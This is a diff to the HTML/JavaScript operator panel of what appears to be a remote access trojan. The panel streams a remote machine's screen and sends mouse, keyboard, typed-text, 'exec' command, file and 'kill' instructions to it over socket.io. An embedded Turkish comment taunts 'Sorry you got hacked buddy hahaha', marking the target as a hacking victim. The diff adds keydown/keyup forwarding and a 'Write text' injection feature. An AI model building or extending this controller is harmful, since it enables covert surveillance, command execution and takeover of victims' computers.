@@ -5,19 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Admin</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js"></script>
-<style>
-  body {
-    margin: 0;
-    overflow: hidden; 
-  }
-  img {
-    user-select: none;
-    border: none;
-    width: 100%; 
-    height: 100%; 
-    object-fit: cover; 
-  }
-</style>
+
 </head>
 <body>
     <script>
@@ -71,6 +59,7 @@ socket.on('adminmessagec', data => {
     const base64Data = data.screenshot;
     const blob = new Blob([base64Data], { type: 'image/png' });
     const imageUrl = URL.createObjectURL(blob);
+    URL.revokeObjectURL(document.getElementById("screenshotImg").src);
     document.getElementById('screenshotImg').src = imageUrl;
     ping = Date.now()-data.time
     document.getElementById("pingg").innerHTML = "Ping:"+ping+"ms"
@@ -108,8 +97,13 @@ document.getElementById('screenshotImg').addEventListener("mousemove",function(e
   if(!mousemove) return;
     socket.emit("adminmessage",{ machine:machine,move:[event.clientX,event.clientY]})
 })
-window.addEventListener("keypress",function(event){
-    socket.emit("adminmessage",{ machine:machine,keypress:event.key.toLowerCase().replaceall("arrow","") })
+window.addEventListener("keydown", function(event) {
+  event.preventDefault();
+    socket.emit("adminmessage",{ machine:machine,keydown:event.key.toLocaleLowerCase().replaceAll("arrow","") })
+})
+window.addEventListener("keyup", function(event) {
+  event.preventDefault();
+    socket.emit("adminmessage",{ machine:machine,keyup:event.key.toLocaleLowerCase().replaceAll("arrow","") })
 })
 
 var filename = ""
@@ -126,6 +120,12 @@ if (userInput !== null) {
  socket.emit("adminmessage",{ machine:machine,exec:userInput})
 }})
 
+document.getElementById('writetexta').addEventListener("click",function(event){
+  const userInput = prompt("Paste text:");
+if (userInput !== null) {
+ socket.emit("adminmessage",{ machine:machine,writetext:userInput})
+}})
+
 document.getElementById('filea').addEventListener("click",function(event){
   const userInput = prompt("Filename:");
 if (userInput !== null) {
@@ -140,16 +140,137 @@ document.getElementById('movemousea').addEventListener("click",function(event){m
 
 
 
-        </script>
-  <img id="screenshotImg">
-  <input type="file" name="file" id="fileInput" >
-  <button style="left:0;top:0;position: absolute;" id="execa">Exec</button>
-  <button style="left:50px;top:0;position: absolute;" id="filea" >File</button>
-  <button style="top:0;left:95px;position: absolute;" id="killa" >Kill</button>
-  <button style="top:0;left:140px;position: absolute;" id="movemousea" >Movemouse</button>
-  <button style="top:0;left:240px;position: absolute;" onclick="navigator.clipboard.writeText(JSON.stringify(process,null,2))" >Copy process</button>
-  <button style="top:0;left:350px;position: absolute;" onclick="startstream(prompt('FPS:'))" >Restream</button>
-  <button style="top:0;left:450px;position: absolute;" onclick="startstream(prompt('0 to 100:'),'q')" >Quality</button>
-  <a style="top:0;left:550px;position: absolute;color:red" id="pingg" >Ping</a>
+    </script>
+  
+  <img id="screenshotImg" style="position: absolute; z-index: -1;">
+
+<div class="menubb" style="z-index: 100; padding-bottom: 10px;">
+  <button onclick="menu()" class="menub" id="menub" hidden> </button>
+  <label class="menubText" for="menub">Toggle Menu</label>
+</div>
+  <br>
+  <br>
+  
+
+  <style>
+
+    .menubText{
+      width: 75px;
+      height: 50px;
+      background-color: indigo;
+      color: white;
+      padding: .5rem;
+      font-family: sans-serif;
+      border-radius: 10%;
+      cursor: pointer;
+      margin-left: .2rem;
+      position: relative;
+      top: 1rem;
+      transition: ease-in-out .1s;
+    }
+  </style>
+
+
+
+<div class="container">
+ 
+
+ <div class="buttons" style="z-index: 100;">
+  <button class="ustbutton" id="execa">Exec</button>
+  <button class="ustbutton" id="filea" >File</button>
+  <button class="ustbutton" id="killa" >Kill</button>
+  <button class="ustbutton" id="writetexta" >Write text</button>
+  <button class="ustbutton"  id="movemousea" >Movemouse</button>
+  <button class="ustbutton"  onclick="navigator.clipboard.writeText(JSON.stringify(process,null,2))" >Copy process</button>
+  <button class="ustbutton"  onclick="startstream(prompt('FPS:'))" >Restream</button>
+  <button class="ustbutton"  onclick="startstream(prompt('0 to 100:'),'q')" >Quality</button>
+  <label class="uploadtext" for="fileInput">Choose file</label>
+
+</div>
+<br/>
+
+<input type="file" name="file" id="fileInput" hidden/>
+<a class="pingtxt" id="pingg" >Ping</a>
+</div>
+
+  
+<script>
+  var isZero = false;
+  function menu(params) {
+    console.log(isZero)
+    if(isZero != true) { 
+     document.querySelector(".container").style.display="none"
+      isZero = true
+    } else{
+      document.querySelector(".container").style.display="inline"
+      isZero = false
+    }
+  }//Üzgünüm hacklendin dostum hahaha
+</script>
+
+  <style>
+
+    .menub{
+      margin: 10px 3px 10px;
+    }
+
+body {
+margin: 0;
+  overflow: hidden;
+  user-select: none;
+
+  }
+  img {
+    user-select: none;
+    border: none;
+    size: 100%;
+  }
+
+    .ustbutton{
+      float: left;
+      margin-right: 10px;
+      border-radius: 10%;
+      width: 100px;
+      height: 25px;
+      border: 0;
+      box-shadow: 5px 4px 10px black;
+      transition: ease-in-out .1s;
+    }
+        .pingtxt{
+      color: red;
+    }
+
+    .buttons{
+      display: inline-block;
+      padding-left: 0;
+      padding-bottom: 1rem;
+    }
+
+    .ustbutton:hover{
+     width: 120px;
+     height: 40px;
+     font-size: 110%;
+     background-color: rgb(160, 158, 158);
+    }
+
+    .uploadtext{
+      width: 75px;
+      height: 50px;
+      background-color: indigo;
+      color: white;
+      padding: 0.5rem;
+      font-family: sans-serif;
+      border-radius: 10%;
+      cursor: pointer;
+      margin-left: .2rem;
+     transition: ease-in-out .1s;
+    }
+
+    .uploadtext:hover{
+      font-size: 110%;
+      background-color: rgb(51, 4, 85);
+    }
+
+  </style>
 </body>
 </html>
